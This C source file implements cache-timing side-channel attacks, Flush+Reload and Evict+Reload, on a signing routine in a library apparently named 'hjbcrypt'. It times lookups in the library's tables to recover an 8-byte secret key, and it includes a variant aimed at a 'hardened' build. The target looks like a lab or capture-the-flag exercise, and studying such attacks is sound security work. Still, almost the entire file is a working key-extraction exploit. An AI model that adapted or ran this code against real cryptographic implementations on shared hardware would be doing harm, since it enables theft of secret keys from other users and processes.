#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <x86intrin.h>
#include <sys/mman.h>

#include "hjbcrypt.h"

#define array_size(x) (sizeof(x) / sizeof(*(x)))

#ifdef HARDENED
extern uint64_t Te0[];
extern uint64_t Te1[];
#else
extern uint64_t Te0[];
extern uint64_t secret;
#endif

int round_max = 1000;
//		Defining timing infrastructure
#define CYCLES 		uint32_t
#define ADDR_PTR	uint64_t

//		Page mapping for the evict operation
char *pmap;

//		Cache properties
CYCLES CACHE_MISS_LATENCY = 120;
#define L3_CACHE_SIZE 12*1024*1024

unsigned long time_access_no_flush(const char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    "  mfence             \n" // guarantees that every load and store instruction that precedes in program order the MFENCE instruction is globally visible
    "  lfence             \n" // LFENCE does not execute until all prior instructions have completed locally
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}

CYCLES measure_one_block_access_time(volatile void* addr)
{
    CYCLES cycles;

    asm volatile("mov %1, %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "mov %%eax, %%edi\n\t"
            "mov (%%r8), %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "sub %%edi, %%eax\n\t"
    : "=a"(cycles) /*output*/
    : "r"(addr)
    : "r8", "edi");

    return cycles;
}

extern inline __attribute__((always_inline))
void clflush(volatile void* addr)
{
    asm volatile ("clflush (%0)"::"r"(addr));
}

//		To set the threshold dynamically
unsigned int find_threshold()
{
	const char *addr = malloc(8);
	uint64_t t1=0, t2=0, t_sum_flush=0, t_sum_no_flush=0;
	for(size_t i = 0; i < round_max; i++){
		if(i%2==0){
			asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (addr) :);
		}
		
		if(i%2==0){
			t_sum_flush += time_access_no_flush(addr);
		}
		else{
			t_sum_no_flush += time_access_no_flush(addr);
		}
	}
	t_sum_flush = t_sum_flush / (round_max/2);
	t_sum_no_flush = t_sum_no_flush / (round_max/2);
	printf("flush: %lu\nno flush: %lu\n", t_sum_flush, t_sum_no_flush);
	return (t_sum_flush + t_sum_no_flush)/2;
	 
}
extern inline __attribute__((always_inline))
void evict() 
{
	int i;
	int j;

	for (i = 0; i < 6; i++) 
	{
		volatile char *ptr = pmap;
		for (j = 0; j < L3_CACHE_SIZE ; j += 4096) 
		{
			*(ptr + j);
		}
	}
}

//		Random Value Initialization
void randomizeInput(unsigned char input[8], int position)
{
	for(int i=0; i<8; i++)
		if(i != position)
			input[i] = rand()%256;

}


//		Result Dissolving
#ifdef HARDENED
unsigned char check_probability(size_t timingResults[16])
{
#else
unsigned char check_probability(size_t timingResults[256])
{
#endif	
	unsigned char maxIndex = 0;
	size_t maxHit   = 0;
#ifdef HARDENED
	for (int i = 0; i < 16; i++)
	{
#else
	for (int i = 0; i < 256; ++i)
	{
#endif
		if(timingResults[i] > maxHit)
		{
			maxHit = timingResults[i];
			maxIndex = (unsigned char)i;
			timingResults[i] = 0;
		}
	}

	return maxIndex;

}


void stage_1()
{
	unsigned char out[8];
	unsigned char in[8];
	unsigned char retrievedKey[8];

	size_t timingResults[256] = {0};
	CYCLES elapsedTime;

	for (int i = 0; i < 8; ++i)
	{
		
		for (int val = 0; val < 256; val++)
		{
			in[i] = (unsigned char)val;

			for(int round = 0; round < round_max; ++round)
			{
				randomizeInput(in, i);

				clflush(Te0);

				hjb_sign_data(out, in, 8);

				elapsedTime = measure_one_block_access_time(Te0);
				if(elapsedTime < CACHE_MISS_LATENCY)
					timingResults[val]++;
			}
			
		}
		retrievedKey[i] = check_probability(timingResults);
		printf("Retrieved key[%d]: %x\n", i, retrievedKey[i]);

	}	
}


void stage_2()
{
	unsigned int threshold = find_threshold();
	//	Evict+Reload attack
	pmap = mmap(NULL, L3_CACHE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
	memset(pmap, 'X', L3_CACHE_SIZE);

	

	uint64_t *tables[] = {Te0};

	unsigned char out[8];
	unsigned char in[8];
	unsigned char *cl;
	unsigned char key[8];
	unsigned byte;
	size_t i, j, k, t;
	uint64_t dt, t0;
	size_t count;

	size_t results[256] = { 0 };

	size_t round;
	size_t best;
	uint32_t core_id;

	for (t = 0; t < array_size(tables); ++t) {
		cl = (unsigned char *)tables[t];

		for (k = 0; k < 8; ++k) {
			for (i = 0; i < array_size(results); ++i)
				results[i] = 0;



			for (byte = 0; byte < 256; ++byte) {

				count = 0;

				in[k] = byte;

				for (round = 0; round < 1000; ++round) {
					for (i = 0; i < 8; ++i) {
						if (i != k)
						in[i] = rand() % 256;
					}

					//_mm_clflush(cl);
					//_mm_sfence();
					evict();
					hjb_sign_data(out, in, 8);

					t0 = __rdtscp(&core_id);
					*(volatile unsigned char *)cl;
					dt = __rdtscp(&core_id) - t0;

					if (dt < threshold)
						++count;
				}


				results[byte] = count;

			}

			count = 0;
			best = 0;

			for (i = 0; i < array_size(results); ++i) {
				if (count < results[i]) {
					count = results[i];
					best = i;
				}
			}


			key[k] = best;

		}
	}

	printf("Recovered key: ");

	for (k = 0; k < 8; ++k) {
		printf("0x%02x ", key[k]);
	}

	printf("(");

	for (k = 0; k < 8; ++k) {
		printf("%c", isprint(key[k]) ? key[k] : '.');
	}

	printf(")\n");

}

#ifdef HARDENED
void stage_3()
{
	uint64_t *tables[] = {Te0, Te1};

	unsigned char out[8];
	unsigned char in[8];
	unsigned char *cl;
	unsigned char key[8];
	unsigned byte;
	size_t i, j, k, t;
	uint64_t dt, t0;
	size_t count;

	size_t results[16] = { 0 };
	size_t round;
	size_t best;
	uint32_t core_id;

	for (t = 0; t < array_size(tables); ++t) 
	{
		cl = (unsigned char *)tables[t];

		for (k = 0; k < 8; ++k) 
		{
			for (i = 0; i < array_size(results); ++i)
				results[i] = 0;


			for (byte = 0; byte < 256; byte += 16) 
			{

				count = 0;

				in[k] = byte;

				for (round = 0; round < 100; ++round) 
				{
					for (i = 0; i < 8; ++i) 
					{
						if (i != k)
						in[i] = rand() % 256;
					}

					_mm_clflush(cl);
					_mm_sfence();
					hjb_sign_data(out, in, 8);

					t0 = __rdtscp(&core_id);
					*(volatile unsigned char *)cl;
					dt = __rdtscp(&core_id) - t0;

					if (dt < 120)
						++count;
				}
				results[byte >> 4] = count;

			}

			count = 0;
			best = 0;

			for (i = 0; i < array_size(results); ++i) 
			{
				if (count < results[i]) {
					count = results[i];
					best = i;
				}
			}


			if (t == 0) {
				key[k] = best << 4;
			} else {
				key[k] |= best;
			}

		}
	}

	printf("Recovered key: ");

	for (k = 0; k < 8; ++k) 
	{
		printf("0x%02x ", key[k]);
	}

	printf("(");

	for (k = 0; k < 8; ++k) 
	{
		printf("%c", isprint(key[k]) ? key[k] : '.');
	}

	printf(")\n");
}
#endif

int main(void)
{
#ifdef HARDENED
	stage_3();
#else
	//stage_1();
	stage_2();
#endif
	return 0;
}
